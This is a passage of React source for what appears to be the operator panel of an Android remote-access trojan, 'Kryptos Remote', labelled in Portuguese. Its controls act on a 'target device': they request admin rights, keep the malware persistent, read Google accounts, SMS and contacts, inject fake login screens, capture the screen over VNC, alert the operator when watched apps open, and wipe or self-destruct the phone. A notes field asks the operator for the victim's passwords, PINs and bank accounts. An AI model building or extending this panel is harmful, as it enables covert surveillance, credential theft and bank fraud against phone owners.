            </p>
            <button
              onClick={() => navigate('/dashboard')}
              className="w-full py-3 bg-gradient-to-r from-[#ef4444] via-[#84cc16] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] rounded-md font-black uppercase tracking-widest text-xs shadow-[0_0_20px_rgba(239,68,68,0.5)] transition-all transform hover:-translate-y-0.5"
            >
               Voltar ao Dashboard
            </button>
          </div>
        </div>
      )}
      
      {/*  CYBER HUD NAVBAR HEADER */}
      <header className="hud-glass-card border-b border-[#2a2a31]/20 sticky top-0 z-30 shadow-2xl backdrop-blur-2xl">
        <div className="w-full px-3 sm:px-5 lg:px-6">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center space-x-4">
              <button
                onClick={() => navigate('/dashboard')}
                className="p-2.5 hud-btn-action rounded-md text-slate-300 hover:text-[#ef4444] transition-all border border-[#2a2a31]/60 hover:border-[#2a2a31]/50 shadow-md"
                title="Voltar ao Painel"
              >
                <ArrowLeft className="w-5 h-5" />
              </button>
              <div className="flex items-center space-x-3 border-r border-[#24242a] pr-4">
                <div className="flex items-center gap-2.5">
                  <img
                    src="/gangstar-logo.svg?v=2"
                    alt="Kryptos Remote"
                    className="w-7 h-7 flex-shrink-0"
                    style={{ filter: 'drop-shadow(0 0 10px rgba(255, 43, 43, 0.9))' }}
                  />
                  <span className="text-lg font-black bg-gradient-to-r from-[#fca5a5] via-[#f87171] to-[#ef4444] bg-clip-text text-transparent tracking-wide drop-shadow-[0_0_12px_rgba(190,242,100,0.7)] font-sans uppercase">
                    KRYPTOS REMOTE
                  </span>
                </div>
              </div>
              
              <div className="flex items-center gap-2">
                <div className="bg-slate-950/90 border border-[#2a2a31]/30 text-[#e8e8ea] px-3 py-1 rounded-md text-xs font-mono font-bold shadow-inner flex items-center gap-2">
                  <Smartphone className="w-3.5 h-3.5 text-[#ef4444]" />
                  <span>{device.custom_name ? device.custom_name.toUpperCase() : device.model}</span>
                </div>
                <button
                  onClick={handleRename}
                  className="p-1.5 hover:bg-[#121214]/50 rounded-md transition-colors text-slate-400 hover:text-[#ef4444] border border-transparent hover:border-[#2a2a31]/30"
                  title="Renomear Aparelho"
                >
                  
                </button>
              </div>

              {/* Status Online Pulse */}
              <div className={`px-3.5 py-1 rounded-full text-xs font-bold flex items-center gap-2 font-mono ${
                device.is_online 
                  ? 'bg-emerald-950/60 border border-emerald-500/40 text-emerald-400 shadow-[0_0_12px_rgba(16,185,129,0.25)]' 
                  : 'bg-[#121214]/60 border border-[#2a2a31]/40 text-[#ef4444] animate-pulse'
              }`}>
                <span className={device.is_online ? 'neon-dot-online' : 'neon-dot-offline'} />
                <span>{device.is_online ? 'ONLINE' : 'OFFLINE'}</span>
              </div>

              {/* Status Admin */}
              <div className={`px-3 py-1 rounded-full text-xs font-bold flex items-center gap-1.5 font-mono ${
                device.admin_active 
                  ? 'bg-purple-950/60 text-[#fca5a5] border border-[#f87171]/40 shadow-[0_0_12px_rgba(239,68,68,0.25)]' 
                  : 'bg-amber-950/40 text-amber-400 border border-amber-500/30'
              }`}>
                <ShieldAlert className="w-3.5 h-3.5" />
                <span>{device.admin_active ? 'Admin Ativo' : 'Admin Inativo'}</span>
              </div>
            </div>

            <div className="flex items-center space-x-3">
              {/*  Seletor de Zoom do Painel */}
              <div className="flex items-center bg-[#2e0903]/90 border border-[#2a2a31]/30 rounded-md px-2 py-1 gap-1 shadow-inner">
                <button
                  type="button"
                  onClick={() => handleZoomChange(panelZoom - 10)}
                  className="px-1.5 py-0.5 rounded hover:bg-[#ef4444]/20 text-[#ef4444] font-bold text-xs font-mono transition-all"
                  title="Diminuir Zoom (-10%)"
                >
                  -
                </button>
                <span className="text-[11px] font-mono font-black text-[#e8e8ea] w-10 text-center select-none">
                  {panelZoom}%
                </span>
                <button
                  type="button"
                  onClick={() => handleZoomChange(panelZoom + 10)}
                  className="px-1.5 py-0.5 rounded hover:bg-[#ef4444]/20 text-[#ef4444] font-bold text-xs font-mono transition-all"
                  title="Aumentar Zoom (+10%)"
                >
                  +
                </button>
                {panelZoom !== 100 && (
                  <button
                    type="button"
                    onClick={() => handleZoomChange(100)}
                    className="text-[9px] font-mono text-[#ef4444]/80 hover:text-white px-1 ml-0.5 bg-[#121214]/60 rounded border border-[#2a2a31]/30 transition-all"
                    title="Redefinir Zoom (100%)"
                  >
                    100%
                  </button>
                )}
              </div>

              <LanguageSelector />
              {/*  Botão Robô Assistente */}
              <button
                onClick={() => setShowRobotTutorial(true)}
                className="flex items-center space-x-2 px-3.5 py-2 rounded-md bg-gradient-to-r from-[#121214]/90 via-[#440e03] to-[#121214]/90 border border-[#3a3a44]/60 hover:border-[#4a4a56] text-[#ef4444] hover:text-white text-xs font-bold uppercase tracking-wider transition-all font-mono shadow-[0_0_15px_rgba(239,68,68,0.3)] hover:shadow-[0_0_25px_rgba(239,68,68,0.6)] transform hover:scale-105 active:scale-95"
                title="Abrir Tutorial do Robô Assistente (Tela Preta, VNC, Telas Fake)"
              >
                <RobotAvatar size={20} isFloating theme="cyan" />
                <span>ROBÔ ASSISTENTE</span>
              </button>

              {/* 🪟 Botão Modo Flutuante */}
              <button
                onClick={() => {
                  if (!isFloatingMode) {
                    organizeCockpitLayout();
                  } else {
                    setIsFloatingMode(false);
                  }
                }}
                className={`flex items-center space-x-2 px-4 py-2 rounded-md text-xs font-bold uppercase tracking-wider transition-all font-mono ${
                  isFloatingMode 
                    ? 'hud-pill-active shadow-[0_0_15px_rgba(239,68,68,0.4)]' 
                    : 'hud-btn-action text-slate-300 hover:text-white'
                }`}
                title="Modo Flutuante Inovador - Alinha VNC, Screen V2 e Controles automaticamente"
              >
                <Layout className="w-4 h-4 text-[#ef4444]" />
                <span>{isFloatingMode ? '🪟 MODO FLUTUANTE HUD' : '🪟 MODO FLUTUANTE'}</span>
              </button>
              
              <button
                onClick={onLogout}
                className="flex items-center space-x-2 px-4 py-2 bg-gradient-to-r from-[#ef4444] via-[#84cc16] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] rounded-md text-xs font-bold uppercase tracking-wider transition-all shadow-[0_0_15px_rgba(239,68,68,0.35)] transform hover:-translate-y-0.5"
              >
                <LogOut className="w-4 h-4" />
                <span>SAIR</span>
              </button>
            </div>
          </div>
        </div>
      </header>

      <div 
        className="max-w-[1850px] mx-auto px-4 sm:px-6 lg:px-8 py-5 relative z-10 font-sans transition-all duration-150 origin-top"
        style={{ zoom: `${panelZoom}%` }}
      >

        <div className="grid grid-cols-1 lg:grid-cols-4 gap-4">
          
          {/* ===== COLUNA ESQUERDA: Central de Comando & Permissões (Visual Renovado VIP) ===== */}
          <div className="space-y-3.5 order-2 lg:order-1">

            {/* ¡ CARD 1: CENTRAL DE PERMISSÕES & ADMIN (DESIGN HIGHLIGHTED VIP) */}
            <div id="tour-admin-perms" className="bg-gradient-to-b from-[#380b04]/95 via-[#2c0903]/90 to-[#1c0503]/95 border border-amber-500/30 shadow-[0_0_25px_rgba(245,158,11,0.12)] rounded-md p-4 transition-all hover:border-amber-400/50 relative overflow-hidden group">
              <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-amber-500/10 via-amber-400 to-amber-500/10"></div>
              
              <div className="flex items-center justify-between mb-3.5">
                <h3 className="text-amber-400 font-black uppercase text-[11px] tracking-wider flex items-center gap-2 font-mono">
                  <ShieldAlert className="w-4 h-4 text-amber-400 animate-pulse" />
                  {t('panel.permissions_admin')}
                </h3>
                <span className="px-2 py-0.5 rounded-full bg-amber-500/15 border border-amber-500/30 text-[9px] font-bold text-amber-300 uppercase tracking-widest font-mono">
                  {t('panel.quick_access')}
                </span>
              </div>

              {/* Status Indicator Bar */}
              <div className="bg-[#170503]/80 rounded-md p-2.5 border border-amber-500/20 mb-3 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <div className="w-2.5 h-2.5 rounded-full bg-emerald-400 shadow-[0_0_8px_rgba(52,211,153,0.8)] animate-pulse" />
                  <span className="text-[11px] font-bold text-slate-200">{t('panel.device_admin')}</span>
                </div>
                <button
                  id="btn-check-admin-status"
                  onClick={handleCheckAdminStatus}
                  className="px-2.5 py-1 bg-[#121214]/40 border border-[#2a2a31]/30 hover:border-[#3a3a44] hover:bg-[#1a1a1e]/40 text-[#ef4444] rounded-md text-[10px] font-bold uppercase tracking-wider transition-all flex items-center gap-1"
                  title="Verifica se o Administrador de Dispositivo está ativo"
                >
                  <RefreshCw className="w-3 h-3 text-[#ef4444]" />
                  {t('panel.status')}
                </button>
              </div>

              {/* Botões de Ação de Permissões */}
              <div className="space-y-2">
                <button
                  id="btn-request-admin"
                  onClick={handleRequestAdminPermission}
                  className="w-full py-2.5 bg-gradient-to-r from-amber-600/30 via-[#84cc16]/30 to-amber-700/30 border border-amber-500/50 hover:border-amber-400 hover:from-amber-600/45 hover:to-[#84cc16]/45 text-amber-300 rounded-md font-black uppercase tracking-wider text-xs transition-all shadow-[0_0_15px_rgba(245,158,11,0.15)] flex items-center justify-center gap-2"
                  title="Abre a tela de ativação de Administrador no aparelho"
                >
                  <ShieldAlert className="w-4 h-4 text-amber-400" />
                  {t('panel.req_admin')}
                </button>

                <EditableButton
                  id="btn-configure-rom"
                  onClick={() => setShowConfigureRomConfirm(true)}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-configure-rom']}
                  onStyleChange={(style) => updateButtonStyle('btn-configure-rom', style)}
                  className="w-full py-2 bg-[#330b04]/80 border border-[#2a2a31]/30 hover:border-[#3a3a44] hover:bg-[#121214]/30 text-[#ef4444] rounded-md font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2"
                  title="Configura Autostart, Otimização de Bateria, Permissões de Sistema"
                >
                  <Sliders className="w-4 h-4 text-[#ef4444]" /> {t('panel.optimize_rom')}
                </EditableButton>

                <EditableButton
                  id="btn-lockscreen"
                  onClick={() => setShowLockscreenModal(true)}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-lockscreen']}
                  onStyleChange={(style) => updateButtonStyle('btn-lockscreen', style)}
                  className="w-full py-2 bg-gradient-to-r from-yellow-600/20 to-amber-600/20 border border-yellow-500/40 hover:border-yellow-300 text-yellow-300 rounded-md font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2"
                >
                  <Lock className="w-4 h-4 text-yellow-400" /> {t('panel.passwords_pin')}
                </EditableButton>

                {/* Persistência de Tela */}
                <div className="pt-1 flex gap-2">
                  <button
                    onClick={() => {
                      sendCommand({ action: 'SCREEN_PERSISTENCE', enabled: true });
                      addLog(' Persistência de tela ATIVADA!');
                    }}
                    className="flex-1 py-2 bg-gradient-to-r from-rose-950/40 to-[#1a1a1e]/40 border border-[#ef4444]/40 hover:border-rose-400 text-rose-300 rounded-md font-bold uppercase tracking-wider text-[11px] transition-all flex items-center justify-center gap-1.5"
                    title="Mantém a tela sempre acesa"
                  >
                    <Lock className="w-3.5 h-3.5 text-rose-400" /> {t('panel.keep_screen_on')}
                  </button>
                  <button
                    onClick={() => {
                      sendCommand({ action: 'SCREEN_PERSISTENCE', enabled: false });
                      addLog(' Persistência de tela DESATIVADA');
                    }}
                    className="flex-1 py-2 bg-[#210703] border border-[#2a2a31]/60 hover:border-[#8b8b94] text-slate-300 rounded-md font-bold uppercase tracking-wider text-[11px] transition-all flex items-center justify-center gap-1.5"
                    title="Modo padrão de tela"
                  >
                    <Eye className="w-3.5 h-3.5 text-slate-400" /> {t('panel.normal_mode')}
                  </button>
                </div>
              </div>
            </div>

            {/*  CARD 2: CENTRO DE COMANDO & NAVEGAÇO */}
            <div className="bg-[#280903]/90 border border-[#2a2a31]/25 shadow-[0_4px_25px_rgba(0,0,0,0.5)] rounded-md p-4 transition-all hover:border-[#3a3a44]/40 relative overflow-hidden group">
              <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-[#f87171]/40 to-transparent"></div>
              
              <h3 className="text-[#ef4444] font-black uppercase text-xs tracking-wider mb-3 flex items-center gap-2 font-mono">
                <Smartphone className="w-4 h-4 text-[#ef4444]" />
                {t('panel.nav_commands')}
              </h3>
              
              {/* Botão Power */}
              <div 
                className="relative mb-3"
                onMouseDown={handlePowerMouseDown}
                onMouseUp={handlePowerMouseUp}
                onMouseLeave={handlePowerMouseLeave}
                onTouchStart={handlePowerMouseDown}
                onTouchEnd={handlePowerMouseUp}
              >
                <EditableButton
                  id="btn-power"
                  onClick={() => {}} 
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-power']}
                  onStyleChange={(style) => updateButtonStyle('btn-power', style)}
                  className={`w-full py-2.5 text-white rounded-md font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2 ${
                    isPowerLongPressed 
                      ? 'bg-gradient-to-r from-[#84cc16] to-[#ef4444] scale-95 shadow-[0_0_15px_rgba(239,68,68,0.5)]' 
                      : 'bg-gradient-to-r from-[#121214]/40 to-rose-950/40 border border-[#2a2a31]/40 hover:bg-[#1a1a1e]/40 hover:border-[#3a3a44] text-[#ef4444] shadow-[0_0_10px_rgba(239,68,68,0.1)]'
                  }`}
                >
                  <Power className="w-4 h-4 text-[#ef4444]" />
                  {isPowerLongPressed ? '³ Menu...' : t('panel.toggle_screen')}
                </EditableButton>
              </div>

              {/* Botões Principais: Voltar / Home / Recents */}
              <div className="grid grid-cols-3 gap-2 mb-3">
                <EditableButton
                  id="btn-back"
                  onClick={() => sendCommand({ action: 'BACK' })}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-back']}
                  onStyleChange={(style) => updateButtonStyle('btn-back', style)}
                  className="py-2.5 bg-[#3a0c04]/70 border border-[#2a2a31]/30 hover:border-[#3a3a44] hover:bg-[#541206] text-slate-200 rounded-md font-bold transition-all flex flex-col items-center justify-center gap-1 shadow-sm"
                  title="Voltar"
                >
                  <ChevronLeft className="w-4 h-4 text-[#ef4444]" />
                  <span className="text-[10px] uppercase font-mono tracking-wider"> {t('panel.back')}</span>
                </EditableButton>
                
                <EditableButton
                  id="btn-home"
                  onClick={() => sendCommand({ action: 'HOME' })}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-home']}
                  onStyleChange={(style) => updateButtonStyle('btn-home', style)}
                  className="py-2.5 bg-[#3a0c04]/70 border border-[#2a2a31]/30 hover:border-[#3a3a44] hover:bg-[#541206] text-slate-200 rounded-md font-bold transition-all flex flex-col items-center justify-center gap-1 shadow-sm"
                  title="Tela Inicial"
                >
                  <span className="w-4 h-4 rounded-full border-2 border-[#3a3a44]/90 flex items-center justify-center text-[9px] font-black text-[#ef4444]">H</span>
                  <span className="text-[10px] uppercase font-mono tracking-wider">  {t('panel.home')}</span>
                </EditableButton>
                
                <EditableButton
                  id="btn-recents"
                  onClick={() => sendCommand({ action: 'RECENTS' })}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-recents']}
                  onStyleChange={(style) => updateButtonStyle('btn-recents', style)}
                  className="py-2.5 bg-[#3a0c04]/70 border border-[#2a2a31]/30 hover:border-[#3a3a44] hover:bg-[#541206] text-slate-200 rounded-md font-bold transition-all flex flex-col items-center justify-center gap-1 shadow-sm"
                  title="Apps Recentes"
                >
                  <LayoutGrid className="w-4 h-4 text-[#ef4444]" />
                  <span className="text-[10px] uppercase font-mono tracking-wider"> {t('panel.recents')}</span>
                </EditableButton>
              </div>
              
              {/* Controle Rápido íícones */}
              <div className="bg-[#1a0503]/70 p-2 rounded-md border border-[#2a2a31]/15 mb-3">
                <p className="text-[9px] text-[#ef4444]/80 font-black mb-1.5 uppercase tracking-widest font-mono text-center">{t('panel.hardware_actions')}</p>
                <div className="grid grid-cols-5 gap-1.5">
                  <button
                    type="button"
                    onClick={() => sendCommand({ action: 'VIBRATE' })}
                    className="py-2 bg-[#330b04] border border-[#2a2a31]/20 hover:border-[#3a3a44] text-slate-300 rounded-md flex items-center justify-center transition-all"
                    title="Vibrar Celular"
                  >
                    <Activity className="w-3.5 h-3.5 text-[#ef4444] animate-pulse" />
                  </button>
                  <button
                    type="button"
                    onClick={() => sendCommand({ action: 'VOLUME_DOWN' })}
                    className="py-2 bg-[#330b04] border border-[#2a2a31]/20 hover:border-[#3a3a44] text-slate-300 rounded-md flex items-center justify-center transition-all"
                    title="Volume -"
                  >
                    <Volume1 className="w-3.5 h-3.5 text-slate-300" />
                  </button>
                  <button
                    type="button"
                    onClick={() => sendCommand({ action: 'VOLUME_UP' })}
                    className="py-2 bg-[#330b04] border border-[#2a2a31]/20 hover:border-[#3a3a44] text-slate-300 rounded-md flex items-center justify-center transition-all"
                    title="Volume +"
                  >
                    <Volume2 className="w-3.5 h-3.5 text-slate-300" />
                  </button>
                  <button
                    type="button"
                    onClick={() => sendCommand({ action: 'LOCK_DEVICE' })}
                    className="py-2 bg-[#330b04] border border-[#2a2a31]/20 hover:border-rose-400 text-slate-300 rounded-md flex items-center justify-center transition-all"
                    title="Bloquear Aparelho"
                  >
                    <Lock className="w-3.5 h-3.5 text-rose-400" />
                  </button>
                  <button
                    type="button"
                    onClick={() => sendCommand({ action: 'SNAP_SCREEN' })}
                    className="py-2 bg-[#330b04] border border-[#2a2a31]/20 hover:border-[#3a3a44] text-slate-300 rounded-md flex items-center justify-center transition-all"
                    title="Tirar Print"
                  >
                    <Camera className="w-3.5 h-3.5 text-[#ef4444]" />
                  </button>
                </div>
              </div>
              
              {/* Notificações & Configurações */}
              <div className="grid grid-cols-2 gap-2">
                <EditableButton
                  id="btn-notifications"
                  onClick={() => sendCommand({ action: 'NOTIFICATIONS' })}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-notifications']}
                  onStyleChange={(style) => updateButtonStyle('btn-notifications', style)}
                  className="py-2 bg-[#330b04] border border-[#2a2a31]/25 hover:border-[#3a3a44] text-slate-200 rounded-md font-bold transition-all flex items-center justify-center gap-1.5 text-[11px] uppercase tracking-wider font-mono"
                  title="Abrir Barra de Notificações"
                >
                  <Bell className="w-3.5 h-3.5 text-[#ef4444]" /> {t('panel.notifications')}
                </EditableButton>
                
                <EditableButton
                  id="btn-quick-settings"
                  onClick={() => sendCommand({ action: 'QUICK_SETTINGS' })}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-quick-settings']}
                  onStyleChange={(style) => updateButtonStyle('btn-quick-settings', style)}
                  className="py-2 bg-[#330b04] border border-[#2a2a31]/25 hover:border-[#3a3a44] text-slate-200 rounded-md font-bold transition-all flex items-center justify-center gap-1.5 text-[11px] uppercase tracking-wider font-mono"
                  title="Abrir Configurações Rápidas do Celular"
                >
                  <Settings className="w-3.5 h-3.5 text-[#ef4444]" /> {t('panel.quick_config')}
                </EditableButton>
              </div>
            </div>

            {/*  CARD 3: FERRAMENTAS & RECURSOS */}
            <div className="bg-[#280903]/90 border border-[#2a2a31]/30 shadow-[0_4px_25px_rgba(0,0,0,0.5)] rounded-md p-4 transition-all hover:border-[#3a3a44]/50 relative overflow-hidden group">
              <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-[#f87171]/50 to-transparent"></div>
              
              <h3 className="text-[#ef4444] font-black uppercase text-xs tracking-wider mb-3 flex items-center gap-2 font-mono">
                <Package className="w-4 h-4 text-[#ef4444]" />
                {t('panel.tools_apps')}
              </h3>

              <div className="space-y-2">
                <EditableButton
                  id="btn-apps"
                  onClick={() => {
                    setShowAppsModal(true);
                    fetchInstalledApps();
                  }}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-apps']}
                  onStyleChange={(style) => updateButtonStyle('btn-apps', style)}
                  className="w-full py-2 bg-gradient-to-r from-emerald-600/20 to-teal-600/20 border border-emerald-500/40 hover:border-emerald-400 text-emerald-300 rounded-md font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2"
                >
                  <Smartphone className="w-4 h-4 text-emerald-400" /> {t('panel.view_installed_apps')}
                </EditableButton>

                <EditableButton
                  id="btn-google-accounts"
                  onClick={() => {
                    setShowGoogleAccountsModal(true);
                    sendCommand({ action: 'GET_DEVICE_INFO' });
                  }}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-google-accounts']}
                  onStyleChange={(style) => updateButtonStyle('btn-google-accounts', style)}
                  className="w-full py-2 bg-gradient-to-r from-amber-600/25 via-yellow-600/25 to-[#ef4444]/25 border border-amber-400/50 hover:border-amber-300 text-amber-300 rounded-md font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2 shadow-[0_0_12px_rgba(245,158,11,0.2)] cursor-pointer"
                >
                  <Mail className="w-4 h-4 text-amber-400" />  VER CONTAS GOOGLE
                </EditableButton>

                <EditableButton
                  id="btn-send-sms"
                  onClick={() => setShowSmsModal(true)}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-send-sms']}
                  onStyleChange={(style) => updateButtonStyle('btn-send-sms', style)}
                  className="w-full py-2 bg-gradient-to-r from-[#ef4444]/25 via-[#ef4444]/25 to-[#84cc16]/25 border border-[#3a3a44]/50 hover:border-[#4a4a56] text-[#ef4444] rounded-md font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2 shadow-[0_0_12px_rgba(239,68,68,0.2)] cursor-pointer"
                >
                  <MessageSquare className="w-4 h-4 text-[#ef4444]" />  ENVIAR / LER SMS
                </EditableButton>

                <EditableButton
                  id="btn-view-contacts"
                  onClick={() => {
                    setShowContactsModal(true);
                    fetchContacts();
                  }}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-view-contacts']}
                  onStyleChange={(style) => updateButtonStyle('btn-view-contacts', style)}
                  className="w-full py-2 bg-gradient-to-r from-amber-600/25 via-[#84cc16]/25 to-yellow-600/25 border border-amber-400/50 hover:border-amber-300 text-amber-300 rounded-md font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2 shadow-[0_0_12px_rgba(245,158,11,0.2)] cursor-pointer"
                >
                  <Users className="w-4 h-4 text-amber-400" />  VER CONTATOS
                </EditableButton>
                
                <EditableButton
                  id="btn-install-apk"
                  onClick={() => setShowInstallApkModal(true)}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-install-apk']}
                  onStyleChange={(style) => updateButtonStyle('btn-install-apk', style)}
                  className="w-full py-2 bg-gradient-to-r from-[#84cc16]/20 to-amber-600/20 border border-[#ef4444]/40 hover:border-[#f87171] text-[#fca5a5] rounded-md font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2"
                >
                  <Package className="w-4 h-4 text-[#f87171]" /> {t('panel.install_new_apk')}
                </EditableButton>
                
                <div id="tour-fake-injects" className="w-full">
                  <EditableButton
                    id="btn-injection"
                    onClick={() => setShowInjectionModal(true)}
                    isEditMode={isLayoutEditMode}
                    customStyle={layoutPrefs.buttonStyles['btn-injection']}
                    onStyleChange={(style) => updateButtonStyle('btn-injection', style)}
                    className="w-full py-2 bg-gradient-to-r from-[#ef4444]/25 via-[#ef4444]/25 to-[#ef4444]/25 border border-[#3a3a44]/50 hover:border-[#4a4a56] text-[#ef4444] rounded-md font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2 shadow-[0_0_12px_rgba(239,68,68,0.2)]"
                  >
                    <Syringe className="w-4 h-4 text-[#ef4444]" /> {t('panel.fake_screen_injection')}
                  </EditableButton>
                </div>

                <EditableButton
                  id="btn-custom-captures"
                  onClick={() => setShowCustomCapturesModal(true)}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-custom-captures']}
                  onStyleChange={(style) => updateButtonStyle('btn-custom-captures', style)}
                  className="w-full py-2 bg-gradient-to-r from-teal-600/20 to-emerald-600/20 border border-teal-500/40 hover:border-teal-300 text-teal-300 rounded-md font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2"
                >
                  <Download className="w-4 h-4 text-teal-400" /> {t('panel.custom_captures')}
                </EditableButton>

                <button
                  id="btn-self-destruct"
                  onClick={handleSelfDestruct}
                  className="w-full py-2 bg-gradient-to-r from-[#121214]/40 to-[#1a1a1e]/30 border border-[#2a2a31]/40 hover:border-[#3a3a44] text-[#ef4444] rounded-md font-bold uppercase tracking-wider text-xs transition-all flex items-center justify-center gap-2"
                  title="Desinstala o app do aparelho"
                >
                  <ShieldAlert className="w-4 h-4 text-[#ef4444]" /> {t('panel.self_destruct')}
                </button>

                <EditableButton
                  id="btn-format-device"
                  onClick={handleFormatDevice}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-format-device']}
                  onStyleChange={(style) => updateButtonStyle('btn-format-device', style)}
                  className="w-full py-1.5 bg-[#0a0a0b] border border-[#1a1a1e]/60 hover:border-[#3a3a44] text-[#ef4444]/80 hover:text-[#ef4444] rounded-md font-bold uppercase tracking-wider text-[10px] transition-all flex items-center justify-center gap-1.5"
                >
                  š  {t('panel.wipe_device')}
                </EditableButton>
              </div>
            </div>

            {/*  CARD 4: BLOCO DE NOTAS DE SENHAS & ANOTAES */}
            <div className="bg-[#2c0903]/85 border border-[#2a2a31]/30 shadow-[0_4px_25px_rgba(0,0,0,0.5)] backdrop-blur-xl rounded-md p-4 transition-all hover:border-[#3a3a44]/50 relative overflow-hidden">
              <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-[#f87171]/50 to-transparent"></div>
              
              <div className="flex items-center justify-between mb-2.5">
                <h3 className="text-[#ef4444] font-black uppercase text-xs tracking-wider flex items-center gap-2 font-mono">
                  <FileText className="w-4 h-4 text-[#ef4444] animate-pulse" />
                   BLOCO DE NOTAS / SENHAS
                </h3>
                <span className="text-[9px] font-mono font-bold text-emerald-400 bg-emerald-950/40 border border-emerald-500/30 px-2 py-0.5 rounded-full">
                   Salvo Auto
                </span>
              </div>

              <div className="space-y-2">
                <textarea
                  value={deviceNotes}
                  onChange={(e) => handleNotesChange(e.target.value)}
                  placeholder="Escreva senhas, PINs, contas bancárias, dados do alvo ou anotações rápidas..."
                  rows={4}
                  className="w-full px-3 py-2.5 bg-[#190503]/90 border border-[#2a2a31]/30 rounded-md text-white placeholder-[#8b8b94] focus:outline-none focus:border-[#3a3a44] focus:ring-1 focus:ring-[#ef4444]/40 text-xs font-mono transition-all resize-none shadow-inner custom-scrollbar"
                />

                <div className="flex items-center gap-2">
                  <button
                    onClick={() => {
                      navigator.clipboard.writeText(deviceNotes);
                      addLog(' Notas copiadas para a área de transferência!');
                    }}
                    disabled={!deviceNotes.trim()}
                    className="flex-1 py-1.5 bg-gradient-to-r from-[#ef4444] via-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] disabled:from-[#24242a] disabled:to-slate-850 disabled:text-[#6f6f78] text-[#10120a] rounded-md font-bold uppercase tracking-wider text-[10px] font-mono transition-all flex items-center justify-center gap-1 shadow-md cursor-pointer"
                  >
                    <Copy className="w-3 h-3" /> Copiar
                  </button>
                  
                  <button
                    onClick={() => {
                      if (confirm('Deseja limpar as anotações deste dispositivo?')) {
                        handleNotesChange('');
                        addLog(' Bloco de notas limpo!');
                      }
                    }}
                    disabled={!deviceNotes.trim()}
                    className="py-1.5 px-3 bg-[#121214]/40 border border-[#2a2a31]/30 hover:border-[#3a3a44] hover:bg-[#1a1a1e]/40 disabled:border-[#24242a] disabled:bg-[#121214] disabled:text-[#6f6f78] text-[#ef4444] rounded-md font-bold uppercase tracking-wider text-[10px] font-mono transition-all flex items-center justify-center gap-1 cursor-pointer"
                    title="Limpar bloco de notas"
                  >
                    <Trash2 className="w-3 h-3" /> Limpar
                  </button>
                </div>
              </div>
            </div>

          </div>

          {/* ===== COLUNA CENTRAL: VNC Screen + Screen Reader V2 ===== */}
          <div id="device-viewer" className="space-y-2 order-1 lg:order-2 lg:col-span-2">
            {/*  BANNER DE ALERTA DE ABERTURA DE APLICATIVO MONITORADO */}
            {activeAppAlert && (
              <div className="bg-gradient-to-r from-[#ef4444] via-amber-600 to-[#ef4444] text-[#10120a] p-3 rounded-md shadow-[0_0_30px_rgba(239,68,68,0.6)] border border-[#3a3a44] flex items-center justify-between animate-pulse mb-2 z-50">
                <div className="flex items-center space-x-3">
                  <div className="p-2 bg-black/40 rounded-md border border-[#4a4a56]">
                    <Bell className="w-6 h-6 text-yellow-300 animate-bounce" />
                  </div>
                  <div>
                    <h4 className="text-sm font-black uppercase tracking-wider font-mono flex items-center gap-2">
                       APLICATIVO MONITORADO ABERTO NO DISPOSITIVO ALVO!
                    </h4>
                    <p className="text-xs font-bold text-amber-200 mt-0.5">
                      App Detectado: <span className="text-white font-mono bg-black/60 px-2 py-0.5 rounded border border-amber-400/40">{activeAppAlert.appName} ({activeAppAlert.pkg})</span>
                    </p>
                  </div>
                </div>

                <div className="flex items-center space-x-2">
                  <button
                    onClick={() => {
                      setShowCombinedVncV2(true);
                      if (!isScreenReaderEnabled) toggleScreenReader();
                      if (!isCaptureEnabled) toggleCapture();
                    }}
                    className="px-3 py-1.5 bg-black/80 hover:bg-black text-[#ef4444] border border-[#3a3a44] rounded-md text-xs font-bold uppercase tracking-wider font-mono shadow-md transition-all cursor-pointer"
                  >
                     Abrir VNC + V2
                  </button>
                  <button
                    onClick={() => setActiveAppAlert(null)}
                    className="p-1.5 text-white/80 hover:text-white bg-black/40 hover:bg-black/80 rounded-md transition-all cursor-pointer"
                    title="Fechar Alerta"
                  >
                    <X className="w-5 h-5" />
                  </button>
                </div>
              </div>
            )}

